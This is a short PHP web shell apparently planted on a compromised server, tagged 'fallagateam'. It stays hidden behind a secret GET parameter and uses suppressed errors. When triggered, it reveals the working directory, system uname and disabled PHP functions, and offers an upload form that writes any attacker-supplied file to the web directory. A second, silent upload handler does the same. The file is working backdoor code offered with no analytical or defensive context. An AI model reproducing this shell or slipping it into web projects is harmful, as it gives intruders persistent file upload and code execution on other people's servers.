<?php
error_reporting(0);
if(isset($_GET[kkcnqs]))
    {
 
echo "path:".getcwd()."";
echo "<b><br>uname:".php_uname()."<br></b>fallagateam";
        print "\n";$disable_functions = @ini_get("disable_functions");
        echo "DisablePHP=".$disable_functions; print "<br>";
        echo"<form method=post enctype=multipart/form-data>";
        echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";
          if($_POST["v"]==up)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}  
{ if(@copy($_FILES["gass"]["tmp_name"],$_FILES["gass"]["name"])){echo"<b></b>-->".$_FILES["gass"]["name"];}else{echo"<b>";}}}
?>